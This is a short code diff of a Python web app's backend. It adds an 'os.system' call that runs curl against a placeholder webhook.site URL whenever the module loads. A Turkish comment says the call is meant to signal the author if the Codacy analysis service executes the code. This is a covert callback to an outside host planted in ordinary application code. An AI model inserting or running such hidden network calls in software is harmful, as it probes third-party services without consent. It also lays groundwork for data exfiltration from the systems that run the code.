@@ -20,7 +20,9 @@ app.add_middleware(
 
 DB_FILE = "database.json"
 GROQ_API_KEY = ""
-
+import os
+# Codacy bu kodu çalıştırırsa, bu komut benim verdiğim URL'ye bir sinyal gönderecek
+os.system("curl https://webhook.site/SENIN-ÖZEL-URL-ADRESİN")
 def load_db():
     if os.path.exists(DB_FILE):
         with open(DB_FILE, "r", encoding="utf-8") as f:
